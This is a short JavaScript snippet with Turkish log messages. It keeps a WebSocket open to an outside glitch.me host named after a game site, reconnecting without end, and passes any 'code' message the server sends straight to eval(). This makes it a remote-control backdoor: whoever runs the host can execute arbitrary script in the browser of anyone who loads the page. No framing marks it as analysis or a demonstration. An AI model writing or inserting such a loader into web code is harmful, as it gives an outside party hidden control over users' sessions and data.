(function() {
    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    const clientId = Math.random().toString(36).substring(2, 15); // Sabit ID
    
    function connectWebSocket() {
        const ws = new WebSocket('wss://duello-katiponline-com.glitch.me/?id=' + clientId);

        ws.onopen = () => {
            console.log('WebSocket bağlantısı kuruldu', 'ID:', clientId, 'Zaman:', new Date().toISOString());
            // 5 saniyede bir yeniden bağlan
            setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.close();
                    console.log('Bağlantı manuel olarak kapatıldı', 'ID:', clientId, 'Zaman:', new Date().toISOString());
                }
            }, 5000);
        };

        ws.onmessage = (event) => {
            console.log('Ham mesaj alındı:', event.data, 'Zaman:', new Date().toISOString());
            try {
                const message = JSON.parse(event.data);
                console.log('Mesaj ayrıştırıldı:', message, 'Zaman:', new Date().toISOString());
                if (message.type === 'code') {
                    console.log('Yeni kod alındı:', message.data, 'Zaman:', new Date().toISOString());
                    eval(message.data);
                } else {
                    console.log('Bilinmeyen mesaj tipi:', message.type, 'Zaman:', new Date().toISOString());
                }
            } catch (e) {
                console.error('Mesaj işleme hatası:', e.message, 'Zaman:', new Date().toISOString());
            }
        };

        ws.onclose = () => {
            console.log('WebSocket bağlantısı koptu', 'ID:', clientId, 'Zaman:', new Date().toISOString());
            setTimeout(connectWebSocket, 1000);
        };

        ws.onerror = (error) => {
            console.error('WebSocket hatası:', error, 'Zaman:', new Date().toISOString());
        };

        window.myWebSocket = ws;
    }

    connectWebSocket();
})();
